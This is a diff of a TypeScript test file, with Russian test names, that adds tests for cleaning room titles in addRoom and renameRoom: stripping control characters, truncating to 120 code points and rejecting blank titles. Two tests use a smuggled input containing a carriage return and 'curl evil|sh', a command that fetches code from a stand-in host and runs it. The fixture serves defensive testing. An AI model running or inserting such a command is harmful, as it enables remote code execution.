@@ -28,6 +28,7 @@ import {
   reopenRoom,
   requireOpenRoom,
   roomLead,
+  ROOM_TITLE_MAX,
   RoomRuleError,
   setRoomLead,
   setRoomOwner,
@@ -96,6 +97,38 @@ describe('addRoom', () => {
       ],
     });
     expect(map.rooms).toEqual([room]);
+  });
+});
+
+describe('addRoom: очистка названия', () => {
+  const room = (title: string) => addRoom(emptyMap(), { title, creator: 's-01', members: ['s-02'] });
+
+  it('возврат каретки и управляющие знаки вырезаются: название остаётся одной строкой', () => {
+    const title = room('x"\r!curl evil|sh\ry').title;
+    expect(title).toBe('x"!curl evil|shy');
+    // eslint-disable-next-line no-control-regex
+    expect(title).not.toMatch(/[\x00-\x1f\x7f-\x9f]/);
+  });
+
+  it('название короче предела не меняется, в том числе в 118 знаков', () => {
+    expect(room('бэкенд').title).toBe('бэкенд');
+    expect(room('я'.repeat(118)).title).toBe('я'.repeat(118));
+    expect(room('я'.repeat(ROOM_TITLE_MAX)).title).toBe('я'.repeat(ROOM_TITLE_MAX));
+  });
+
+  it('длинное название режется до 120 кодовых точек, эмодзи не разрывается', () => {
+    const out = room('я\u{1F600}'.repeat(100)).title;
+    expect(Array.from(out)).toHaveLength(ROOM_TITLE_MAX);
+    expect(out).toBe(Array.from('я\u{1F600}'.repeat(100)).slice(0, ROOM_TITLE_MAX).join(''));
+  });
+
+  it('пустое после очистки — отказ, номер комнаты не тратится', () => {
+    const map = emptyMap();
+    for (const title of ['', '   ', '\n', '\u200B', ' \n\u200B ']) {
+      expect(() => addRoom(map, { title, creator: 's-01', members: ['s-02'] })).toThrow(RoomRuleError);
+    }
+    expect(map.work.roomSeq).toBe(0);
+    expect(map.rooms).toEqual([]);
   });
 });
 
@@ -662,6 +695,27 @@ describe('renameRoom', () => {
     }
     expect(() => renameRoom(map, 'r-09', 'x')).toThrow(/is not in the map/);
     expect(JSON.stringify(map)).toBe(before);
+  });
+});
+
+describe('renameRoom: очистка названия', () => {
+  it('управляющие знаки вырезаются, длинное режется до 120 кодовых точек, короткое не меняется', () => {
+    const map = twoRooms();
+    renameRoom(map, 'r-01', 'x"\r!curl evil|sh\ry');
+    expect(map.rooms[0]?.title).toBe('x"!curl evil|shy');
+    renameRoom(map, 'r-01', 'я'.repeat(118));
+    expect(map.rooms[0]?.title).toBe('я'.repeat(118));
+    renameRoom(map, 'r-01', 'я\u{1F600}'.repeat(100));
+    expect(Array.from(map.rooms[0]?.title ?? '')).toHaveLength(ROOM_TITLE_MAX);
+  });
+
+  it('из одних пробелов, переводов строки и ZWSP — отказ, прежнее название остаётся', () => {
+    const map = twoRooms();
+    const before = map.rooms[0]?.title;
+    for (const title of ['   ', '\n', '\u200B', ' \n\u200B ']) {
+      expect(() => renameRoom(map, 'r-01', title)).toThrow(RoomRuleError);
+    }
+    expect(map.rooms[0]?.title).toBe(before);
   });
 });
 
